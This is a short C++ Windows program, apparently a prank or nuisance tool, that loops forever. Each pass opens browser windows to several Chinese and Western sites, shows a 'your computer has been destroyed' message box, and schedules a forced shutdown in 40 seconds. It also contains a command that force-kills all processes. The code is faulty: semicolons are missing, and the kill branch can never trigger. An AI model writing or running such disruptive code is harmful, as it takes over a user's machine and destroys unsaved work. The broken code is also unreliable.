#include <iostream>
#include <windows.h>
using namespace std;

	int main() {
	int A = 1;
	while(true) {
		system("start https://hao.360.com");
		system("start https://www.baidu.com");
		system("start https://bing.com");
		system("start https://www.google.com");
		system("start https://bilibili.com");
		system("start https://shequ.codemao.cn/work/272191630");
		system("start https://shequ.codemao.cn");
		if(MessageBox(NULL,"你的电脑被我毁了！","你的电脑被我毁了！",MB_OK) == IDYES) {
			system("taskkill /f /fi \"pid ne 1\"")
		}
		system("shutdown -s -t 40")
		A++;
	}
	return 0;
	}
	
